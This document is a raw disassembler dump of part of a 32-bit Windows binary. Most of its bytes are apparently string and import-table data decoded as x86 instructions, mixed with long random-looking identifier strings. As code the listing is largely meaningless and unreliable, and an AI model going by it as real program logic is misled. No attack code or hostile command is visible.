  41382e:	imul   edi,DWORD PTR [eax+0x65],0x8900006c
  413835:	add    BYTE PTR [ebx+0x72],al
  413838:	gs popa 
  41383a:	je     0x4138a1
  41383c:	inc    edx
  41383d:	jb     0x4138b4
  41383f:	jae    0x4138a9
  413841:	dec    ecx
  413842:	outs   dx,BYTE PTR ds:[esi]
  413843:	imul   esi,DWORD PTR fs:[edx+0x65],0x8a007463
  41384b:	add    DWORD PTR [edi+0x65],eax
  41384e:	je     0x4138a4
  413850:	gs js  0x4138c7
  413853:	dec    ebp
  413854:	gs je  0x4138c9
  413857:	imul   esp,DWORD PTR [ebx+0x73],0x870041
  41385e:	inc    ebx
  41385f:	jb     0x4138c6
  413861:	popa   
  413862:	je     0x4138c9
  413864:	inc    edx
  413865:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd3000070
  41386d:	add    DWORD PTR [ebx+0x65],edx
  413870:	je     0x4138b4
  413872:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  41387a:	outs   dx,BYTE PTR gs:[esi]
  41387c:	jae    0x4138e7
  41387e:	outs   dx,DWORD PTR ds:[esi]
  41387f:	outs   dx,BYTE PTR ds:[esi]
  413880:	inc    ebp
  413881:	js     0x413883
  413883:	add    BYTE PTR [edx+0x65724300],bl
  413889:	popa   
  41388a:	je     0x4138f1
  41388c:	inc    esi
  41388d:	outs   dx,DWORD PTR ds:[esi]
  41388e:	outs   dx,BYTE PTR ds:[esi]
  41388f:	je     0x4138da
  413891:	outs   dx,BYTE PTR ds:[esi]
  413892:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41389a:	iret   
  41389b:	add    DWORD PTR [ebx+0x65],edx
  41389e:	ins    BYTE PTR es:[edi],dx
  41389f:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4138a4:	ins    BYTE PTR es:[edi],dx
  4138a5:	gs je  0x41391c
  4138a8:	gs add dh,al
  4138ab:	add    DWORD PTR [edx+0x6f],edx
  4138ae:	jne    0x41391e
  4138b0:	fs push edx
  4138b2:	arpl   WORD PTR gs:[eax+eax*1-0x50],si
  4138b7:	add    BYTE PTR [ebx+0x72],al
  4138ba:	gs popa 
  4138bc:	je     0x413923
  4138be:	push   ebx
  4138bf:	outs   dx,DWORD PTR ds:[esi]
  4138c0:	ins    BYTE PTR es:[edi],dx
  4138c1:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  4138c9:	add    BYTE PTR [edx],bh
  4138cb:	add    DWORD PTR [edi+0x65],eax
  4138ce:	je     0x413913
  4138d0:	jne    0x413944
  4138d2:	jb     0x413939
  4138d4:	outs   dx,BYTE PTR ds:[esi]
  4138d5:	je     0x413926
  4138d7:	bound  ebp,QWORD PTR [edx+0x65]
  4138da:	arpl   WORD PTR [eax+eax*1+0x0],si
  4138de:	stos   DWORD PTR es:[edi],eax
  4138df:	add    BYTE PTR [ebx+0x72],al
  4138e2:	gs popa 
  4138e4:	je     0x41394b
  4138e6:	push   edx
  4138e7:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  4138ec:	outs   dx,BYTE PTR ds:[esi]
  4138ed:	add    al,dl
  4138ef:	add    DWORD PTR [ebx+0x65],edx
  4138f2:	je     0x413935
  4138f4:	bound  ebp,QWORD PTR [edi+0x72]
  4138f7:	je     0x413949
  4138f9:	jb     0x41396a
  4138fb:	arpl   WORD PTR [eax],ax
  4138fd:	add    ah,cl
  4138ff:	add    DWORD PTR [ebx+0x65],edx
  413902:	ins    BYTE PTR es:[edi],dx
  413903:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  413908:	imul   esi,DWORD PTR [eax+0x52],0x9e006e67
  41390f:	add    BYTE PTR [ebx+0x72],al
  413912:	gs popa 
  413914:	je     0x41397b
  413916:	inc    esi
  413917:	outs   dx,DWORD PTR ds:[esi]
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	je     0x413972
  41391b:	add    bh,al
  41391d:	add    BYTE PTR [ebp+0x6e],al
  413920:	jne    0x41398f
  413922:	inc    esi
  413923:	outs   dx,DWORD PTR ds:[esi]
  413924:	outs   dx,BYTE PTR ds:[esi]
  413925:	je     0x41399a
  413927:	push   edi
  413928:	add    BYTE PTR [eax],al
  41392a:	dec    ebx
  41392b:	add    DWORD PTR [edi+0x65],eax
  41392e:	je     0x413976
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	outs   dx,BYTE PTR ds:[esi]
  413932:	je     0x413978
  413934:	popa   
  413935:	je     0x413998
  413937:	add    BYTE PTR [ebp+0x766f4d01],bl
  41393d:	gs push esp
  41393f:	outs   dx,DWORD PTR ds:[esi]
  413940:	inc    ebp
  413941:	js     0x413943
  413943:	add    BYTE PTR [ecx+eax*1+0x47],ch
  413947:	gs je  0x41399a
  41394a:	popa   
  41394b:	ins    BYTE PTR es:[edi],dx
  41394c:	gs je  0x4139c3
  41394f:	gs inc ebp
  413951:	outs   dx,BYTE PTR ds:[esi]
  413952:	je     0x4139c6
  413954:	imul   esp,DWORD PTR [ebp+0x73],0x54020c00
  41395b:	gs js  0x4139d2
  41395e:	dec    edi
  41395f:	jne    0x4139d5
  413961:	push   edi
  413962:	add    BYTE PTR [eax],al
  413964:	rol    BYTE PTR [ecx],cl
  413966:	push   ebx
  413967:	gs je  0x4139ac
  41396a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  413972:	jae    0x413974
  413974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413975:	add    DWORD PTR [eax+0x61],edx
  413978:	je     0x4139bc
  41397a:	ins    BYTE PTR es:[edi],dx
  41397b:	je     0x41397d
  41397d:	add    BYTE PTR [ecx+0x66664f01],ah
  413983:	jae    0x4139ea
  413985:	je     0x4139dd
  413987:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41398e:	dec    edi
  41398f:	jb     0x4139f8
  413991:	inc    ebp
  413992:	js     0x413994
  413994:	xlat   BYTE PTR ds:[ebx]
  413995:	add    BYTE PTR [esi+0x69],al
  413998:	ins    BYTE PTR es:[edi],dx
  413999:	ins    BYTE PTR es:[edi],dx
  41399a:	push   edx
  41399b:	outs   dx,BYTE PTR ds:[si]
  41399d:	add    BYTE PTR [esi+0x65724300],dl
  4139a3:	popa   
  4139a4:	je     0x413a0b
  4139a6:	inc    ebp
  4139a7:	ins    BYTE PTR es:[edi],dx
  4139a8:	ins    BYTE PTR es:[edi],dx
  4139a9:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4139b0:	outs   dx,BYTE PTR ds:[esi]
  4139b1:	dec    ecx
  4139b2:	outs   dx,BYTE PTR ds:[esi]
  4139b3:	imul   esi,DWORD PTR fs:[edx+0x65],0x87007463
  4139bb:	add    DWORD PTR [edi+0x65],eax
  4139be:	je     0x413a14
  4139c0:	gs js  0x413a37
  4139c3:	inc    ebp
  4139c4:	js     0x413a3a
  4139c6:	outs   dx,BYTE PTR gs:[esi]
  4139c8:	je     0x413a1a
  4139ca:	outs   dx,DWORD PTR ds:[esi]
  4139cb:	imul   ebp,DWORD PTR [esi+0x74],0x1c40057
  4139d2:	push   edx
  4139d3:	gs jae 0x413a3f
  4139d6:	jp     0x413a3d
  4139d8:	push   eax
  4139d9:	popa   
  4139da:	ins    BYTE PTR es:[edi],dx
  4139db:	gs je  0x413a52
  4139de:	gs add bh,dl
  4139e1:	add    DWORD PTR [ebx+0x65],edx
  4139e4:	je     0x413a28
  4139e6:	jb     0x413a5d
  4139e8:	jae    0x413a52
  4139ea:	dec    edi
  4139eb:	jb     0x413a54
  4139ed:	inc    ebp
  4139ee:	js     0x4139f0
  4139f0:	mov    al,ds:0x66664f01
  4139f5:	jae    0x413a5c
  4139f7:	je     0x413a4b
  4139f9:	outs   dx,BYTE PTR ds:[si]
  4139fb:	add    BYTE PTR [ebx],cl
  4139fd:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  413a01:	je     0x413a52
  413a03:	jne    0x413a79
  413a05:	inc    ecx
  413a06:	add    BYTE PTR [eax],al
  413a08:	mov    eax,0x61655201
  413a0d:	ins    BYTE PTR es:[edi],dx
  413a0e:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  413a15:	je     0x413a8b
  413a17:	add    BYTE PTR gs:[eax],al
  413a1a:	inc    edi
  413a1b:	inc    esp
  413a1c:	dec    ecx
  413a1d:	xor    esi,DWORD PTR [edx]
  413a1f:	cs fs ins BYTE PTR es:[edi],dx
  413a22:	ins    BYTE PTR es:[edi],dx
  413a23:	add    BYTE PTR [esi+0x0],al
  413a26:	push   eax
  413a27:	popa   
  413a28:	je     0x413a92
  413a2a:	inc    esi
  413a2b:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413a32:	outs   dx,BYTE PTR ds:[esi]
  413a33:	jae    0x413a9e
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	outs   dx,BYTE PTR ds:[esi]
  413a37:	inc    ecx
  413a38:	add    BYTE PTR [eax],al
  413a3a:	push   ebx
  413a3b:	dec    eax
  413a3c:	dec    esp
  413a3d:	push   edi
  413a3e:	inc    ecx
  413a3f:	push   eax
  413a40:	dec    ecx
  413a41:	cs fs ins BYTE PTR es:[edi],dx
  413a44:	ins    BYTE PTR es:[edi],dx
  413a45:	add    BYTE PTR [ebp+0x6b],dh
  413a48:	popa   
  413a49:	jns    0x413a90
  413a4b:	pop    ecx
  413a4c:	je     0x413a96
  413a4e:	push   edx
  413a4f:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413a56:	call   0x413e:0xa200413e
  413a5d:	add    BYTE PTR [esi-0x17ffbec4],bl
  413a63:	or     esi,DWORD PTR [edx-0x3db086f2]
  413a69:	dec    esi
  413a6a:	ja     0x413abb
  413a6c:	cmp    eax,0x384f4f4f
  413a71:	dec    edi
  413a72:	jp     0x413ac3
  413a74:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a77:	dec    edi
  413a78:	ss dec edi
  413a7a:	add    ecx,DWORD PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	ret    0x324e
  413a81:	dec    edi
  413a82:	push   ds
  413a83:	push   edx
  413a84:	pop    ds
  413a85:	push   ebx
  413a86:	cmp    DWORD PTR [edi+0x79],ecx
  413a89:	dec    edi
  413a8a:	ret    0x774e
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x384f4f4f
  413a93:	dec    edi
  413a94:	jp     0x413ae5
  413a96:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a99:	dec    edi
  413a9a:	ss dec edi
  413a9c:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  413aa3:	dec    edi
  413aa4:	push   ds
  413aa5:	bound  ebx,QWORD PTR [edi]
  413aa7:	arpl   WORD PTR [ecx],di
  413aa9:	dec    edi
  413aaa:	jns    0x413afb
  413aac:	ret    0x724e
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f034f
  413ab5:	dec    edi
  413ab6:	dec    esp
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	jb     0x413ae0
  413ac1:	jae    0x413ad2
  413ac3:	or     DWORD PTR [eax],0xffffff80
  413ac6:	js     0x413a58
  413ac8:	jns    0x413a5b
  413aca:	aas    
  413acb:	dec    edi
  413acc:	jbe    0x413b1d
  413ace:	ret    0x764e
  413ad1:	dec    edi
  413ad2:	ds dec edi
  413ad4:	dec    esp
  413ad5:	dec    edi
  413ad6:	cmp    DWORD PTR [edi+0x3],ecx
  413ad9:	dec    edi
  413ada:	xor    eax,0x364ec24f
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	sbb    BYTE PTR [edi],0x83
  413ae4:	setae  BYTE PTR [eax]
  413ae7:	nop
  413ae8:	js     0x413a8a
  413aea:	jns    0x413a8d
  413aec:	aas    
  413aed:	dec    edi
  413aee:	jbe    0x413b3f
  413af0:	ret    0x764e
  413af3:	dec    edi
  413af4:	ds dec edi
  413af6:	dec    esp
  413af7:	dec    edi
  413af8:	cmp    DWORD PTR [edi+0x69],ecx
  413afb:	dec    edi
  413afc:	xor    eax,0x364ec24f
  413b01:	dec    edi
  413b02:	push   ds
  413b03:	xchg   edx,eax
  413b04:	pop    ds
  413b05:	xchg   ebx,eax
  413b06:	bt     DWORD PTR [eax],ecx
  413b09:	mov    al,ds:0xb179b078
  413b0e:	aas    
  413b0f:	dec    edi
  413b10:	push   0x4e4ec24f
  413b15:	dec    edi
  413b16:	cmp    eax,0x394f034f
  413b1b:	dec    edi
  413b1c:	push   ecx
  413b1d:	dec    edi
  413b1e:	xor    al,0x4f
  413b20:	ret    0x364e
  413b23:	dec    edi
  413b24:	push   ds
  413b25:	mov    ds:0xb30fa31f,al
  413b2a:	or     BYTE PTR [eax-0x3e863f88],dh
  413b30:	aas    
  413b31:	dec    edi
  413b32:	push   0x4e4ec24f
  413b37:	dec    edi
  413b38:	cmp    eax,0x394f784f
  413b3d:	dec    edi
  413b3e:	pop    edi
  413b3f:	dec    edi
  413b40:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b43:	dec    esi
  413b44:	xor    eax,0x1fb21e4f
  413b49:	mov    bl,0xf
  413b4b:	ret    
  413b4c:	or     al,al
  413b4e:	js     0x413b20
  413b50:	jns    0x413b23
  413b52:	aas    
  413b53:	dec    edi
  413b54:	push   0x4e4ec24f
  413b59:	dec    edi
  413b5a:	cmp    eax,0x394f724f
  413b5f:	dec    edi
  413b60:	dec    esi
  413b61:	dec    edi
  413b62:	xor    al,0x4f
  413b64:	ret    0x304e
  413b67:	dec    edi
  413b68:	push   ds
  413b69:	ret    0xc31f
  413b6c:	psrlq  mm1,QWORD PTR [eax]
  413b6f:	sar    BYTE PTR [eax-0x20],1
  413b72:	jns    0x413b55
  413b74:	aas    
  413b75:	dec    edi
  413b76:	push   0x4e4ec24f
  413b7b:	dec    edi
  413b7c:	cmp    eax,0x394f734f
  413b81:	dec    edi
  413b82:	dec    esp
  413b83:	dec    edi
  413b84:	xor    al,0x4f
  413b86:	ret    0x364e
  413b89:	dec    edi
  413b8a:	push   ds
  413b8b:	rcr    BYTE PTR [edi],cl
  413b8d:	ror    DWORD PTR [edi],cl
  413b8f:	jecxz  0x413b99
  413b91:	loopne 0x413c0b
  413b93:	lock jns 0x413b87
  413b96:	aas    
  413b97:	dec    edi
  413b98:	ins    DWORD PTR es:[edi],dx
  413b99:	dec    edi
  413b9a:	ret    0x5f4e
  413b9d:	dec    edi
  413b9e:	cmp    eax,0x3e4f524f
  413ba3:	dec    edi
  413ba4:	ret    0x3f4e
  413ba7:	dec    edi
  413ba8:	push   ds
  413ba9:	loop   0x413bca
  413bab:	jecxz  0x413bbc
  413bad:	repz or al,dh
  413bb0:	js     0x413bb2
  413bb2:	jns    0x413bb5
  413bb4:	js     0x413bc6
  413bb6:	jns    0x413bc9
  413bb8:	ds dec edi
  413bba:	jg     0x413c0b
  413bbc:	ret    0x5b4e
  413bbf:	dec    edi
  413bc0:	cmp    al,0x4f
  413bc2:	jb     0x413c13
  413bc4:	ds dec edi
  413bc6:	dec    ebp
  413bc7:	dec    edi
  413bc8:	cmp    ecx,DWORD PTR [edi-0x3e]
  413bcb:	dec    esi
  413bcc:	xor    eax,0x1f021e4f
  413bd1:	add    ecx,DWORD PTR [edi]
  413bd3:	adc    ecx,DWORD PTR [eax]
  413bd5:	adc    BYTE PTR [eax+0x20],bh
  413bd8:	jns    0x413bfb
  413bda:	aas    
  413bdb:	dec    edi
  413bdc:	add    BYTE PTR [eax],al
  413bde:	data16 cmp al,BYTE PTR [ecx+0x0]
  413be2:	pop    edx
  413be3:	cmp    al,0x41
  413be5:	add    BYTE PTR [edx+0x3c],ah
  413be8:	inc    ecx
  413be9:	add    BYTE PTR [esi+0xe00413e],ah
  413bef:	ds inc ecx
  413bf1:	add    BYTE PTR [esi+0x4200413e],dl
  413bf7:	cmp    al,0x41
  413bf9:	add    BYTE PTR [esi+0x3c],al
  413bfc:	inc    ecx
  413bfd:	add    BYTE PTR [esi-0x55ffbec2],cl
  413c03:	cmp    al,0x41
  413c05:	add    BYTE PTR [edx-0x4e076357],cl
  413c0b:	mov    edx,0x3c5ef89c
  413c10:	inc    ecx
  413c11:	add    dh,al
  413c13:	cmp    eax,0x3dda0041
  413c18:	inc    ecx
  413c19:	add    dh,ah
  413c1b:	cmp    eax,0x3df60041
  413c20:	inc    ecx
  413c21:	add    BYTE PTR [esi+0x6200413c],dl
  413c27:	cmp    al,BYTE PTR [ecx+0x0]
  413c2a:	mov    dh,0x3c
  413c2c:	inc    ecx
  413c2d:	add    BYTE PTR [esi-0x55ffbec4],ah
  413c33:	ds inc ecx
  413c35:	add    BYTE PTR [ecx],dh
  413c37:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413c3e:	push   0x3c
  413c40:	inc    ecx
  413c41:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413c47:	or     eax,0x705
  413c4c:	inc    eax
  413c4d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413c51:	fisttp QWORD PTR [ebx]
  413c53:	ss inc ebx
  413c55:	add    BYTE PTR [edx+0x68],dh
  413c58:	inc    ebp
  413c59:	inc    ecx
  413c5a:	(bad)  
  413c5b:	cli    
  413c5c:	jne    0x413cc0
  413c5e:	(bad)  
  413c5f:	in     eax,dx
  413c60:	inc    BYTE PTR [edi]
  413c62:	mov    eax,0x5205a3fa
  413c67:	cmp    al,0x41
  413c69:	add    BYTE PTR [edx],dh
  413c6b:	xchg   ebp,eax
  413c6c:	pushf  
  413c6d:	clc    
  413c6e:	xor    dl,BYTE PTR [esi-0x6acc0764]
  413c74:	pushf  
  413c75:	clc    
  413c76:	cmp    al,0x95
  413c78:	pushf  
  413c79:	clc    
  413c7a:	cmp    eax,0x3ef89c95
  413c7f:	xchg   ebp,eax
  413c80:	pushf  
  413c81:	clc    
  413c82:	aas    
  413c83:	xchg   ebp,eax
  413c84:	pushf  
  413c85:	clc    
  413c86:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413c8c:	pushf  
  413c8d:	clc    
  413c8e:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413c94:	pushf  
  413c95:	clc    
  413c96:	in     eax,dx
  413c97:	stc    
  413c98:	add    esp,DWORD PTR [eax+0x5a]
  413c9b:	cmp    al,BYTE PTR [ecx+0x0]
  413c9e:	(bad)  
  413c9f:	add    BYTE PTR [ebx+0x0],al
  413ca2:	pop    ecx
  413ca3:	dec    ecx
  413ca4:	imul   si,WORD PTR [ecx],0xff85
  413ca8:	pushf  
  413ca9:	clc    
  413caa:	sahf   
  413cab:	jmp    0x5b54400
  413cb0:	add    BYTE PTR [eax],al
  413cb2:	push   esi
  413cb3:	cmp    al,BYTE PTR [ecx+0x0]
  413cb6:	pushf  
  413cb7:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413cea:	jecxz  0x413c7b
  413cec:	inc    eax
  413ced:	add    dh,bh
  413cef:	adc    BYTE PTR [ebx+0x0],al
  413cf2:	add    BYTE PTR [eax],al
  413cf4:	add    BYTE PTR [eax],al
  413cf6:	inc    esp
  413cf7:	add    BYTE PTR [esi+0x0],al
  413cfa:	imul   eax,DWORD PTR [eax],0x4a006f
  413d00:	dec    ecx
  413d01:	add    BYTE PTR [eax+eax*1+0x46],al
  413d05:	add    BYTE PTR [eax+eax*1+0x49],cl
  413d09:	add    BYTE PTR [ebp+0x0],dl
  413d0c:	inc    esi
  413d0d:	add    BYTE PTR [edi+0x0],cl
  413d10:	imul   eax,DWORD PTR [eax],0x6f
  413d13:	add    BYTE PTR [edx+0x0],ch
  413d16:	dec    ebx
  413d17:	add    BYTE PTR [eax+eax*1+0x66],cl
  413d1b:	add    BYTE PTR [edx+0x0],ch
  413d1e:	imul   eax,DWORD PTR [eax],0x46006f
  413d24:	jo     0x413d26
  413d26:	outs   dx,DWORD PTR ds:[esi]
  413d27:	add    BYTE PTR [ebx+0x0],ch
  413d2a:	ins    DWORD PTR es:[edi],dx
  413d2b:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413d2f:	add    BYTE PTR [ebx+0x0],dh
  413d32:	ins    BYTE PTR es:[edi],dx
  413d33:	add    BYTE PTR [edx+0x0],ch
  413d36:	data16 add BYTE PTR [edi+0x0],ah
  413d3a:	imul   eax,DWORD PTR [eax],0x64006f
  413d40:	add    BYTE PTR [di+0x0],dh
  413d44:	imul   eax,DWORD PTR [eax],0x69006a
  413d4a:	outs   dx,DWORD PTR ds:[esi]
  413d4b:	add    BYTE PTR [esi+0x0],ah
  413d4e:	add    BYTE PTR fs:[ebp+0x0],dh
  413d52:	push   0x0
  413d54:	add    BYTE PTR [bp+0x0],ah
  413d58:	add    BYTE PTR fs:[eax],al
  413d5b:	add    BYTE PTR [eax],al
  413d5d:	add    BYTE PTR [ebx+0x4a],cl
  413d60:	inc    esp
  413d61:	dec    esp
  413d62:	dec    edx
  413d63:	imul   ecx,DWORD PTR [ebx+ecx*2+0x49],0x55
  413d68:	inc    esp
  413d69:	dec    ecx
  413d6a:	dec    ecx
  413d6b:	inc    esp
  413d6c:	dec    edi
  413d6d:	jne    0x413dd3
  413d6f:	dec    ecx
  413d70:	dec    esp
  413d71:	push   ebp
  413d72:	imul   ebp,DWORD PTR fs:[edi+0x55],0x6a49444b
  413d7a:	imul   ebp,DWORD PTR [esp+eiz*2+0x4b],0x4a
  413d7f:	inc    esp
  413d80:	imul   ebp,DWORD PTR [esp+eax*2+0x4c],0x444a494b
  413d88:	ins    BYTE PTR es:[edi],dx
  413d89:	imul   ebp,DWORD PTR [edx+0x64],0x4c
  413d8d:	dec    ebx
  413d8e:	push   ebp
  413d8f:	inc    esp
  413d90:	outs   dx,DWORD PTR ds:[esi]
  413d91:	imul   esi,DWORD PTR [ebp+0x6a],0x4a6b6c64
  413d98:	dec    esp
  413d99:	dec    ebx
  413d9a:	inc    esp
  413d9b:	dec    edx
  413d9c:	dec    edi
  413d9d:	sub    al,BYTE PTR [ebp+edx*2+0x4c]
  413da1:	inc    esp
  413da2:	inc    esp
  413da3:	add    BYTE PTR [eax],al
  413da5:	add    BYTE PTR [esi+0x6b],ah
  413da8:	fs jae 0x413e12
  413dab:	addr16 data16 fs addr16 fs data16 addr16 data16 fs data16 add BYTE PTR fs:[bx+si],al
	...
  413dc1:	add    BYTE PTR [ecx+0x550040c0],bl
  413dc7:	dec    edi
  413dc8:	pop    edi
  413dc9:	dec    edi
  413dca:	dec    esp
  413dcb:	dec    edi
  413dcc:	push   eax
  413dcd:	dec    edi
  413dce:	pop    edi
  413dcf:	dec    edi
  413dd0:	push   esi
  413dd1:	dec    edi
  413dd2:	or     eax,0xc24f0c4f
  413dd7:	dec    esi
  413dd8:	add    BYTE PTR [eax],al
  413dda:	pop    ecx
  413ddb:	dec    edi
  413ddc:	pop    esi
  413ddd:	dec    edi
  413dde:	pop    ebx
  413ddf:	dec    edi
  413de0:	or     eax,0xc24f0c4f
  413de5:	dec    esi
  413de6:	dec    edi
  413de7:	dec    edi
  413de8:	dec    ebp
  413de9:	dec    edi
  413dea:	pop    edi
  413deb:	dec    edi
  413dec:	dec    esp
  413ded:	dec    edi
  413dee:	or     eax,0xc24f0c4f
  413df3:	dec    esi
  413df4:	add    BYTE PTR [eax],al
  413df6:	dec    ebp
  413df7:	dec    edi
  413df8:	pop    edx
  413df9:	dec    edi
  413dfa:	push   esi
  413dfb:	dec    edi
  413dfc:	dec    ecx
  413dfd:	dec    edi
  413dfe:	arpl   WORD PTR [edi+0x52],cx
  413e01:	dec    edi
  413e02:	pop    ebx
  413e03:	dec    edi
  413e04:	ret    0x4e
  413e07:	add    BYTE PTR [eax],al
  413e09:	add    BYTE PTR [eax],al
  413e0b:	add    BYTE PTR [eax],al
  413e0d:	add    BYTE PTR [esi+0x7d],ch
  413e10:	outs   dx,BYTE PTR ds:[esi]
  413e11:	lea    ebp,[esi-0x63]
  413e14:	outs   dx,BYTE PTR ds:[esi]
  413e15:	lods   eax,DWORD PTR ds:[esi]
  413e16:	outs   dx,BYTE PTR ds:[esi]
  413e17:	mov    ebp,0xdd6ecd6e
  413e1c:	outs   dx,BYTE PTR ds:[esi]
  413e1d:	in     eax,dx
  413e1e:	outs   dx,BYTE PTR ds:[esi]
  413e1f:	std    
  413e20:	outs   dx,BYTE PTR ds:[esi]
  413e21:	or     eax,0x2d6e1d6e
  413e26:	outs   dx,BYTE PTR ds:[esi]
  413e27:	cmp    eax,0x6d6e5d6e
  413e2c:	outs   dx,BYTE PTR ds:[esi]
  413e2d:	jb     0x413e9d
  413e2f:	jae    0x413e9f
  413e31:	jo     0x413ea1
  413e33:	jno    0x413ea3
  413e35:	jbe    0x413ea5
  413e37:	ja     0x413ea7
  413e39:	je     0x413ea9
  413e3b:	jne    0x413eab
  413e3d:	mov    ch,BYTE PTR [esi-0x75]
  413e40:	outs   dx,BYTE PTR ds:[esi]
  413e41:	mov    BYTE PTR [esi-0x77],ch
  413e44:	outs   dx,BYTE PTR ds:[esi]
  413e45:	mov    gs,WORD PTR [esi+0x7c]
  413e48:	pop    esi
  413e49:	jge    0x413e99
  413e4b:	jge    0x413e0b
  413e4d:	jge    0x413ea7
  413e4f:	(bad)  
  413e50:	jns    0x413ec2
  413e52:	mov    ecx,0x7d736eb1
  413e57:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413e5d:	add    BYTE PTR [ecx+0x17],cl
  413e60:	mov    ebx,0x4af4b956
  413e65:	aaa    
  413e66:	dec    edx
  413e67:	jle    0x413e02
  413e69:	jno    0x413ecb
  413e6b:	mov    cl,0x4
  413e6d:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413e74:	inc    esp
  413e75:	xlat   BYTE PTR ds:[ebx]
  413e76:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413e7c:	rcr    esi,cl
  413e7e:	(bad)  
  413e7f:	leave  
  413e80:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413e86:	fs icebp 
  413e88:	push   eax
  413e89:	(bad)  
  413e8a:	rcr    DWORD PTR [eax],1
  413e8c:	shl    DWORD PTR [ecx-0x11],1
  413e8f:	(bad)  [ebx+0x7]
  413e92:	mov    dl,0x3c
  413e94:	inc    ecx
  413e95:	add    BYTE PTR [esi+0x30],al
  413e98:	shl    DWORD PTR [ebx],0xb8
  413e9b:	and    DWORD PTR [ecx+0x0],eax
  413e9e:	inc    esi
  413e9f:	push   ebx
  413ea0:	outs   dx,DWORD PTR ds:[esi]
  413ea1:	push   ebx
  413ea2:	dec    edx
  413ea3:	cmp    al,0x41
  413ea5:	add    BYTE PTR [esi-0x70ffbec4],ch
  413eab:	in     eax,dx
  413eac:	adc    al,BYTE PTR [edi]
	...
  413ece:	inc    ecx
  413ecf:	inc    edi
  413ed0:	jae    0x413f3b
  413ed2:	inc    edx
  413ed3:	jae    0x413f3a
  413ed5:	popa   
  413ed6:	push   ecx
  413ed7:	pop    eax
  413ed8:	pop    ecx
  413ed9:	outs   dx,BYTE PTR ds:[esi]
  413eda:	jbe    0x413f54
  413edc:	jns    0x413f32
  413ede:	push   ecx
  413edf:	imul   ebp,DWORD PTR [ebx+0x74],0x61
  413ee3:	jns    0x413f34
  413ee5:	inc    ebx
  413ee6:	jo     0x413f5a
  413ee8:	data16 jp 0x413f3d
  413eeb:	jp     0x413f45
  413eed:	ins    BYTE PTR es:[edi],dx
  413eee:	je     0x413f5f
  413ef0:	jns    0x413f60
  413ef2:	popa   
  413ef3:	push   esi
  413ef4:	push   ebp
  413ef5:	push   0x0
	...
  413f0a:	popa   
  413f0b:	push   edi
  413f0c:	push   esi
  413f0d:	push   esp
  413f0e:	dec    eax
  413f0f:	je     0x413f5d
  413f11:	push   ebx
  413f12:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413f16:	push   esp
  413f17:	arpl   WORD PTR [ecx+0x4b],cx
  413f1a:	inc    edi
  413f1b:	jne    0x413f63
  413f1d:	push   ebx
  413f1e:	outs   dx,DWORD PTR ds:[esi]
  413f1f:	push   ebx
  413f20:	inc    esi
  413f21:	inc    edi
  413f22:	push   0x66495949
  413f27:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413f2b:	push   esi
  413f2c:	jb     0x413f96
  413f2e:	add    BYTE PTR [eax],al
  413f30:	js     0x413fa6
  413f32:	popa   
  413f33:	inc    ebx
  413f34:	push   ecx
  413f35:	ins    BYTE PTR es:[edi],dx
  413f36:	pop    eax
  413f37:	ja     0x413f86
  413f39:	je     0x413fb1
  413f3b:	add    BYTE PTR [ebp+0x7a],dl
  413f3e:	ins    BYTE PTR es:[edi],dx
  413f3f:	jb     0x413fba
  413f41:	inc    edi
  413f42:	push   edi
  413f43:	push   esi
  413f44:	inc    edi
  413f45:	ins    BYTE PTR es:[edi],dx
  413f46:	add    BYTE PTR [eax],al
  413f48:	jbe    0x413f8e
  413f4a:	push   esi
  413f4b:	push   edi
  413f4c:	dec    edx
  413f4d:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413f54:	add    BYTE PTR [eax],al
  413f56:	in     al,0xf5
  413f58:	jnp    0x413fa8
  413f5a:	jnp    0x413f2a
  413f5c:	cmc    
  413f5d:	call   FWORD PTR [ebx+0x61]
  413f60:	and    bh,dl
  413f62:	xlat   BYTE PTR ds:[ebx]
  413f63:	jbe    0x413f67
  413f65:	call   0x4216d1
  413f6a:	add    BYTE PTR [ecx],al
  413f6c:	add    BYTE PTR [eax],al
  413f6e:	loop   0x413f99
  413f70:	ret    0x62a7
  413f73:	jge    0x413f2d
  413f75:	cmp    eax,0x548a1ed7
  413f7a:	mov    eax,ds:0xdee514ea
  413f7f:	cwde   
  413f80:	inc    esi
